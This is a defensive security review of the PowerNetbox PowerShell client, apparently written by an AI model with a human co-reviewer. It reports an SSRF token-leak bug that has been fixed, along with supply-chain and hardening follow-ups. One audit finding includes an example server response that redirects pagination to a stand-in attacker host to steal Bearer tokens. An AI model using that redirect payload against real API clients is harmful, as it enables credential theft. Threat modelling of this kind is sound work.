---
title: Tier 2 Security Review — 2026-04-18
scope: STRIDE threat model + input validation + dependency/supply-chain audit
reviewer: Claude Opus 4.7 (1M) + Elvis
status: 1 HIGH fixed inline, 2 MEDIUM + 3 LOW/INFO documented
follows: 2026-04-18-security-delta-review.md (Tier 1)
---

# Tier 2 Security Review — 2026-04-18

## Scope

Three cybersecurity-skills toolkits ran against PowerNetbox, treated as a
PowerShell *client* of the NetBox REST API (not a server):

1. **STRIDE threat model** (`performing-threat-modeling-with-owasp-threat-dragon`) — broad attack-surface mapping.
2. **OWASP API Top 10** (`testing-api-security-with-owasp-top-10`) — applied from the client side: how inputs flow into requests, how responses are consumed.
3. **Dependency / supply-chain audit** (`performing-sca-dependency-scanning-with-snyk`) — adapted for PowerShell / PSGallery (Snyk doesn't natively cover PS modules).

## TL;DR

- **1 HIGH, fixed in this PR** — SSRF via pagination `.next` URL. The
  unvalidated server-controlled URL could exfiltrate Bearer tokens to an
  attacker-controlled host if the NetBox server were compromised or an
  HTTPS MITM were successful. Fix adds origin validation.
- **2 MEDIUM, documented for follow-up** — PSGallery publish runner
  installs Pester / PSScriptAnalyzer without upper version bounds;
  published module is not code-signed.
- **3 LOW / INFO** — client-side throttling, warn-only URI segment
  validation, Docker `FROM` tag not pinned to digest.
- **Overall posture is strong** — module has effectively zero runtime
  dependencies, URL encoding and HTML encoding use the right primitives,
  no `Invoke-Expression` or other dynamic code execution, file-upload
  path has size + extension + object-type validation, Tier 1 auth/TLS
  hardening is intact.

## Trust boundaries

```
┌─ User workstation ─────────────┐           ┌─ NetBox server ──┐
│                                │           │                  │
│  PowerShell script             │  HTTPS    │  NetBox API      │
│   └─ PowerNetbox cmdlets       │ Bearer    │                  │
│       └─ InvokeNetboxRequest ──┼──────────>│                  │
│           ^                    │<──────────┤  (may be         │
│           │ response data      │ response  │   compromised)   │
│           │                    │           └──────────────────┘
│  SecureString credential       │
│   (in-memory)                  │
│  .env / config files           │          ┌─ PSGallery ──────┐
│   (filesystem ACLs)            │  HTTPS   │                  │
│                                ├─────────>│  Module install  │
└────────────────────────────────┘  (user)  │  Signature chk   │
                                            └──────────────────┘
```

Key trust boundaries:

1. **User workstation ↔ NetBox server**: HTTPS + Bearer token. Assumes
   server is trusted.
2. **SecureString ↔ filesystem credential**: configs on disk protected
   by OS ACLs; user responsibility.
3. **PSGallery ↔ workstation**: distribution channel; tags mutable.
4. **CI ↔ PSGallery**: publication via `Publish-Module` with an API key.

---

## Findings

### [HIGH — FIXED in this PR] TM-1 / IV-1. Pagination `.next` URL followed without origin validation

**File:** `Functions/Helpers/InvokeNetboxRequest.ps1:112-118` (pre-fix)

**Vulnerability:**

When `-All` pagination is enabled, `InvokeNetboxRequest` constructs each
subsequent page's URI directly from the server's response field
`$pageResult.next`:

```powershell
$currentUri = if ($nextUrl) {
    [System.UriBuilder]::new($nextUrl)   # <-- unvalidated
}
```

The same `$Headers` hashtable (containing `Authorization: Bearer <token>`)
is passed to every page. If the NetBox server returns, say:

```json
{"next": "https://attacker.example.com/steal/?cursor=xxx", ...}
```

— the client would send an authenticated GET to `attacker.example.com`,
handing over the live Bearer token in plaintext. This is OWASP API
category **API10:2023 — Unsafe Consumption of APIs** applied to a client.

**Attack scenarios:**

- NetBox server compromised (supply-chain attack on NetBox itself)
- HTTPS MITM (compromised CA, certificate errors when `-SkipCertificateCheck` is used, DNS rebinding)
- Rogue NetBox admin injecting a malicious pagination stub via plugin hook

**Likelihood:** LOW in practice (requires server trust break). **Impact:**
HIGH (full token exfiltration → account takeover on the real NetBox).
Net: **HIGH** due to impact + defense-in-depth principle.

**Fix applied:**

```powershell
$nextBuilder = [System.UriBuilder]::new($nextUrl)
if ($nextBuilder.Scheme -ne $URI.Scheme -or
    $nextBuilder.Host   -ne $URI.Host   -or
    $nextBuilder.Port   -ne $URI.Port) {
    throw "Refusing to follow pagination 'next' URL to a different origin..."
}
$nextBuilder
```

The validation compares scheme + host + port against the *original*
request URI. A response attempting to redirect pagination off-origin
throws a clear error instead of being silently followed. All modern
browsers apply this same rule to `Authorization` headers across redirects
— we match that posture explicitly for an HTTP client library.

**Tests added** (`Tests/Helpers.Tests.ps1`, 4 new cases):

1. Different host → throws
2. Scheme downgrade https→http → throws
3. Port change → throws
4. Matching scheme/host/port → follows normally (regression test)

### [MEDIUM — documented] DS-1. PSGallery publish runner installs Pester / PSScriptAnalyzer without upper version bound

**File:** `.github/workflows/release.yml:22-24, 58-59`

```yaml
Set-PSRepository PSGallery -InstallationPolicy Trusted
Install-Module Pester -Force -Scope CurrentUser -MinimumVersion 5.0.0
Install-Module PSScriptAnalyzer -Force -Scope CurrentUser
```

Pester uses `-MinimumVersion 5.0.0` only — no upper bound. PSScriptAnalyzer
has no version constraint. On every release, the runner that holds
`secrets.PSGALLERY_API_KEY` pulls the latest versions from PSGallery.

A supply-chain compromise of Pester or PSScriptAnalyzer would land on
this runner and could exfiltrate `PSGALLERY_API_KEY` before publication.

**Mitigating factors:**

- `actions/cache@v4` caches modules across runs (memory note: Windows PS
  5.1 CI install from ~180s to ~3s). A cache hit uses the previously-
  downloaded version, not a fresh PSGallery fetch.
- Pester / PSScriptAnalyzer are widely-used modules with responsive
  maintainers and many eyes.

**Recommended follow-up:** pin both modules to exact versions via
`-RequiredVersion`; bump deliberately when vetted. Alternatively, use
`-MaximumVersion` to at least bound the upgrade window.

### [MEDIUM — documented] DS-2. Published module is not code-signed

**File:** `.github/workflows/release.yml:85`

```powershell
Publish-Module -Path './PowerNetbox' -NuGetApiKey $env:PSGALLERY_API_KEY -Verbose
```

PSGallery accepts unsigned modules, but consumers have no way to verify
authenticity — `Get-AuthenticodeSignature` returns `NotSigned`. An
attacker who compromised the PSGallery publish pipeline could push a
malicious version, and downstream users running
`Install-Module PowerNetbox` (default trust policy `Trusted` after one
approve) would get it silently.

**Recommended follow-up:** obtain a code-signing certificate (DigiCert,
Sectigo, etc., ~$200-400/year) and add a `Set-AuthenticodeSignature`
step before `Publish-Module`. Document the signer in CONTRIBUTING.md so
consumers can verify. Optional: also sign git tags via GPG.

### [LOW — documented] IV-2 / TM-6. No client-side rate limiting on pipeline bulk ops

**File:** pipeline consumers of `New-NBDCIMDevice`, `New-NBIPAMAddress`, etc.

When a user pipes many items:

```powershell
1..10000 | ForEach-Object { [pscustomobject]@{ Name = "srv-$_" } } |
  New-NBDCIMDevice -BatchSize 50 -Force
```

Requests fly as fast as the server accepts them. NetBox eventually
rate-limits with 429, which triggers the retry loop's exponential
backoff — so *functionally* it works, but the client isn't a polite
consumer.

`Send-NBBulkRequest` has a `MaxItems` cap (default 10,000 per PR #377)
which prevents runaway — good. But no throttle between legitimate
batches.

**Recommended follow-up (nice-to-have):** optional `-ThrottleMs`
parameter on bulk cmdlets; default off to preserve current behaviour.

### [LOW — documented] TM-2. No certificate pinning for NetBox host

PowerShell's `Invoke-RestMethod` trusts the system CA bundle. A
compromised CA or MITM-friendly corporate proxy could issue a
certificate for the NetBox host that the client would accept. Standard
risk for any HTTPS client; cert pinning is rare in admin tooling and
would break legitimate cert rotation. Documented for completeness; no
action recommended.

### [LOW — documented] TM-3. Token persists in SecureString for session lifetime

`$script:NetboxConfig` holds the credential as a `SecureString` from
`Connect-NBAPI` until the session ends or `Disconnect-NBAPI` is called.
No idle timeout, no explicit clear on error paths.

**Mitigating factors:**

- `SecureString` on Windows uses DPAPI (process-scoped entropy).
  On Linux/macOS, PowerShell uses a weaker obfuscation — per Microsoft
  docs, SecureString is *not* a security boundary on non-Windows.
- PowerShell process memory is accessible to anyone with the same
  session user anyway (`Get-Process` memory dump).

**Recommended follow-up (nice-to-have):** `Disconnect-NBAPI` already
exists; recommend in docs calling it at end of scripts.

### [LOW — documented] DS-3. Docker `FROM` uses mutable tag

**File:** `Dockerfile.branching`

```dockerfile
ARG NETBOX_VERSION=v4.5.2-4.0.0
FROM netboxcommunity/netbox:${NETBOX_VERSION}
```

Uses tag, not `@sha256:...` digest. Tag mutability means a forced push
to the tag (extremely unlikely for netboxcommunity but nonzero) would
change the build. Pure CI infrastructure, not user-facing.

### [INFO] IV-3. URI segment validation is warn-only, not blocking

**File:** `Functions/Helpers/BuildNewURI.ps1:53-55`

```powershell
if ($segment -and $segment -notmatch '^[a-zA-Z0-9_-]+$') {
    Write-Warning "URI segment contains unexpected characters: $segment"
}
```

All segments in practice are literal strings (`'dcim'`, `'devices'`) or
numeric IDs. No cmdlet constructs segments from user-supplied free-form
strings. The warning is defense-in-depth and adequate.

### [INFO] SECURITY.md / dependabot config absent

Project has no `SECURITY.md` disclosure policy file and no
`.github/dependabot.yml`. The Tier 1 review's follow-up list already
includes adding Dependabot for `github-actions`. A brief `SECURITY.md`
pointing to GitHub Security Advisories + a contact email is low-effort
good hygiene.

---

## Strengths worth preserving

- **Module has effectively zero runtime dependencies.** Manifest
  `RequiredModules` and `ExternalModuleDependencies` are empty. No
  transitive vulnerabilities possible at install time.
- **URL encoding via `[System.Uri]::EscapeDataString()`** in
  `BuildNewURI` — cross-platform, safe.
- **HTML encoding via `[System.Net.WebUtility]::HtmlEncode`** in rack
  elevation output (PR #310) — prevents XSS when responses are rendered
  into SVG/HTML.
- **No dynamic code execution anywhere** — zero uses of
  `Invoke-Expression`, `iex`, `[scriptblock]::Create` on response data
  across the 500+ cmdlets.
- **File upload path is hardened** (`New-NBImageAttachment`): 10 MB
  size cap, SVG XSS warning, `Object_Type` `ValidatePattern`,
  `ImagePath` `ValidateScript`, `Object_Id` typed as `uint64`.
- **Bulk ops have a `MaxItems` cap** (default 10,000, PR #377) —
  prevents accidental flood.
- **Tier 1 hardening still intact** — central auth header construction,
  HTTPS default, HTTP plaintext warning, `SkipCertificateCheck` opt-in,
  `AllowInsecureRedirect` warning, token redaction in verbose/error
  paths.

## Follow-up PRs (not in this PR)

| Priority | Item | File(s) |
|---|---|---|
| Medium | Pin Pester / PSScriptAnalyzer to `RequiredVersion` in release.yml | `.github/workflows/release.yml` |
| Medium | Code-sign published module (+ document verification in CONTRIBUTING.md) | release workflow + docs |
| Low | Optional `-ThrottleMs` on bulk cmdlets | `Send-NBBulkRequest.ps1` |
| Low | Add `SECURITY.md` with disclosure policy + contact | project root |
| Low | Pin `Dockerfile.branching` `FROM` to sha256 digest | `Dockerfile.branching` |
| Low | Add `.github/dependabot.yml` for github-actions + docker ecosystems (also in Tier 1 follow-ups) | `.github/dependabot.yml` |

## What was *not* reviewed

- **NetBox server-side security** — out of scope; PowerNetbox is a
  client.
- **User-owned credential storage** (OS keychain integrations) —
  platform-dependent; documented behaviour in `Connect-NBAPI` is
  acceptable.
- **Network-level controls** (VPN, Zero Trust, firewall rules between
  admin workstation and NetBox) — infrastructure domain.
